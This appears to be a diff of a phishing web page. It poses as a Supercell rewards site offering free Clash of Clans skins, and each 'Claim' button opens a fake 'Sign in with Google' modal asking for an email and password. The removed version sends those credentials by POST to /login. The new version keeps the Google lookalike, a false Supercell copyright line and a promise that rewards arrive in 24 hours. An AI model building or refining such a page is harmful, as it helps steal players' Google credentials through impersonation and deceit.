@@ -1,49 +1,92 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Clash of Clans Rewards</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-body { font-family: 'Arial', sans-serif; background:#f5f5f5; margin:0; padding:0; }
-header { background:#ffcc00; padding:20px; text-align:center; font-size:24px; font-weight:bold; box-shadow:0 2px 4px rgba(0,0,0,0.2); }
-.products { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:20px; padding:20px; }
-.item { background:white; padding:15px; border-radius:12px; text-align:center; box-shadow:0 2px 5px rgba(0,0,0,0.1); transition:transform 0.2s; }
-.item:hover { transform:scale(1.05); }
-.item img { max-width:100%; border-radius:10px; }
-button { background:#ff6600; border:none; color:white; padding:10px 15px; border-radius:5px; cursor:pointer; width:100%; font-size:16px; }
-button:hover { background:#e65c00; }
-#loginModal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); }
-.modal-content { background:#fff; margin:10% auto; padding:20px; max-width:400px; border-radius:10px; text-align:center; }
-input { width:100%; padding:10px; margin:8px 0; border:1px solid #ccc; border-radius:5px; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Supercell Rewards</title>
+  <style>
+    body {margin:0;font-family:Arial, sans-serif;background:#f5f5f5;color:#333;}
+    header {background:#111;color:#fff;padding:15px;text-align:center;font-size:1.5em;font-weight:bold;}
+    .banner {width:100%;background:#222;color:#fff;text-align:center;padding:30px 15px;font-size:1.3em;}
+    .products {display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:15px;padding:20px;}
+    .product {background:#fff;border-radius:10px;box-shadow:0 2px 6px rgba(0,0,0,0.15);padding:10px;text-align:center;transition:transform 0.2s;}
+    .product:hover {transform:scale(1.03);}
+    .product img {width:100%;border-radius:8px;}
+    .product h3 {font-size:1em;margin:10px 0;}
+    .price {color:#e53935;font-weight:bold;margin-bottom:10px;}
+    .claim-btn {background:#4285f4;color:#fff;border:none;padding:8px 15px;border-radius:5px;font-size:0.9em;cursor:pointer;transition:background 0.2s;}
+    .claim-btn:hover {background:#3367d6;}
+    footer {background:#111;color:#aaa;padding:20px;text-align:center;margin-top:30px;font-size:0.9em;}
+    /* Google Auth Modal */
+    .modal {display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);justify-content:center;align-items:center;z-index:1000;}
+    .modal-content {background:#fff;width:90%;max-width:350px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.3);padding:20px;text-align:center;}
+    .modal-header {font-size:1.2em;margin-bottom:10px;}
+    .google-logo {width:50px;margin-bottom:10px;}
+    .input {width:100%;padding:8px;margin:8px 0;border:1px solid #ccc;border-radius:5px;font-size:1em;}
+    .login-btn {background:#4285f4;color:#fff;width:100%;padding:10px;border:none;border-radius:5px;font-size:1em;cursor:pointer;}
+    .login-btn:hover {background:#3367d6;}
+    .close {cursor:pointer;position:absolute;top:15px;right:20px;font-size:1.5em;color:#fff;}
+  </style>
 </head>
 <body>
-<header>Clash of Clans Limited-Time Rewards</header>
+<header>Supercell Rewards</header>
+<div class="banner">Claim Your Exclusive Clash of Clans Skins & Scenery!</div>
+
 <div class="products">
-    <div class="item"><img src="https://i.imgur.com/2x0wzXb.png"><h3>Barbarian King Skin</h3><button onclick="openLogin()">Claim</button></div>
-    <div class="item"><img src="https://i.imgur.com/VB3lp5B.png"><h3>Archer Queen Skin</h3><button onclick="openLogin()">Claim</button></div>
-    <div class="item"><img src="https://i.imgur.com/X3CtGgq.png"><h3>Grand Warden Skin</h3><button onclick="openLogin()">Claim</button></div>
-    <div class="item"><img src="https://i.imgur.com/TwOB5X0.png"><h3>Battle Scenery</h3><button onclick="openLogin()">Claim</button></div>
-    <div class="item"><img src="https://i.imgur.com/0XY2sld.png"><h3>Clashiversary Scenery</h3><button onclick="openLogin()">Claim</button></div>
-    <div class="item"><img src="https://i.imgur.com/F2dPGSt.png"><h3>Builder Hall Skin</h3><button onclick="openLogin()">Claim</button></div>
+  <div class="product">
+    <img src="https://i.ibb.co/ZKjv6p7/barbarian-king.jpg" alt="Barbarian King Skin">
+    <h3>Barbarian King Skin</h3>
+    <div class="price">Free <del>$4.99</del></div>
+    <button class="claim-btn" onclick="openModal()">Claim</button>
+  </div>
+  <div class="product">
+    <img src="https://i.ibb.co/3m7PqG8/archer-queen.jpg" alt="Archer Queen Skin">
+    <h3>Archer Queen Skin</h3>
+    <div class="price">Free <del>$4.99</del></div>
+    <button class="claim-btn" onclick="openModal()">Claim</button>
+  </div>
+  <div class="product">
+    <img src="https://i.ibb.co/PM1jY2G/grand-warden.jpg" alt="Grand Warden Skin">
+    <h3>Grand Warden Skin</h3>
+    <div class="price">Free <del>$4.99</del></div>
+    <button class="claim-btn" onclick="openModal()">Claim</button>
+  </div>
+  <div class="product">
+    <img src="https://i.ibb.co/Xz7tWgf/scenery.jpg" alt="Exclusive Scenery">
+    <h3>Exclusive Scenery</h3>
+    <div class="price">Free <del>$9.99</del></div>
+    <button class="claim-btn" onclick="openModal()">Claim</button>
+  </div>
 </div>
 
-<div id="loginModal">
-    <div class="modal-content">
-        <h2>Sign in to Claim</h2>
-        <form action="/login" method="POST">
-            <input type="email" name="email" placeholder="Google Email" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Submit</button>
-        </form>
-        <button onclick="closeLogin()" style="margin-top:10px;background:#ccc;color:#000;">Close</button>
-    </div>
+<footer>
+  © 2025 Supercell. All Rights Reserved. <br>
+  This is a fan-made promotional page.
+</footer>
+
+<!-- Google Auth Modal -->
+<div class="modal" id="authModal">
+  <div class="modal-content">
+    <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png" alt="Google">
+    <div class="modal-header">Sign in with Google</div>
+    <input type="email" class="input" placeholder="Email or phone">
+    <input type="password" class="input" placeholder="Enter your password">
+    <button class="login-btn" onclick="submitLogin()">Next</button>
+  </div>
 </div>
 
 <script>
-function openLogin(){ document.getElementById('loginModal').style.display='block'; }
-function closeLogin(){ document.getElementById('loginModal').style.display='none'; }
+  function openModal() {
+    document.getElementById('authModal').style.display='flex';
+    setTimeout(()=>closeModal(),1000); // Auto close after 1s
+  }
+  function closeModal() {
+    document.getElementById('authModal').style.display='none';
+  }
+  function submitLogin(){
+    alert("Thank you for claiming! Your reward will be delivered in 24 hours.");
+    closeModal();
+  }
 </script>
 </body>
 </html>
